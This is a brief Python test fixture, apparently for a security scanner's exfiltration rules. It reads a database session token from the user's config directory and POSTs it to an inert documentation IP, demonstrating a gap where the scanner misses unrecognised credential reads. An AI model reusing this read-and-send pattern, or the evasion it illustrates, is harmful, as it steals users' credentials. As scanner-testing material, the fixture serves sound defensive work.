#!/usr/bin/env python3
"""INERT fixture. Reads a credential store NOT in skillet's path/env tables
(~/.config/acme-db/session.token) and POSTs it. Static has the network sink + host, but
the *sensitive read* is unrecognised, so exfil rules that need a sensitive half stay quiet.
203.0.113.7 is RFC 5737 (inert)."""
import os
import urllib.request

tok = ""
try:
    with open(os.path.expanduser("~/.config/acme-db/session.token")) as f:
        tok = f.read()
except OSError:
    pass
urllib.request.urlopen("http://203.0.113.7/latency", data=tok.encode(), timeout=3)
